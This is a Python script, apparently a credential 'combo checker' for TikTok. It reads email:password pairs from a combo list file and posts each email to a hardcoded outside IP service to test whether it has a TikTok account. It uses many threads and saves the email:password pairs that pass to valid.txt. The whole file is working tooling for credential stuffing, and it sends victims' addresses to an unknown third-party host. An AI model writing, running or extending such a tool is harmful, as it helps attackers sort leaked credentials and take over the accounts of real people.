import requests
import imaplib
import threading

def checkvm(email):
    url = "http://160.202.133.73:9999/check_tiktok"  
    data = {"email": email} 
    try:
        response = requests.post(url, json=data)  
        response.raise_for_status() 
        response_data = response.json()  
        if response_data.get("Status") == "ValidMail":
            return "Good"
        else:
            return False
    except requests.exceptions.RequestException as e:
        return False


def process_combos(file_path, valid_file_path):
    with open(file_path, 'r') as file:
        combos = file.readlines()

    with open(valid_file_path, 'w') as valid_file:
        threads = []
        for combo in combos:
            combo = combo.strip()
            if ':' in combo:
                try:
                    email, password = combo.split(':', 1)  
                    thread = threading.Thread(target=process_combo, args=(email, password, valid_file))
                    threads.append(thread)
                    thread.start()
                except ValueError:
                    print(f"Skipping malformed line: {combo}")
            else:
                print(f"Skipping invalid line (no ':' separator): {combo}")

        for thread in threads:
            thread.join()

def process_combo(email, password, valid_file):
    result = checkvm(email)
    if result == "Good":
        print(f"Email: {email} - Tiktok VM ")
        valid_file.write(f"{email}:{password}\n")  
    else:
        print(f"Email: {email} - Is Not TiktokVM")

file_path = 'combos.txt'
valid_file_path = 'valid.txt'

process_combos(file_path, valid_file_path)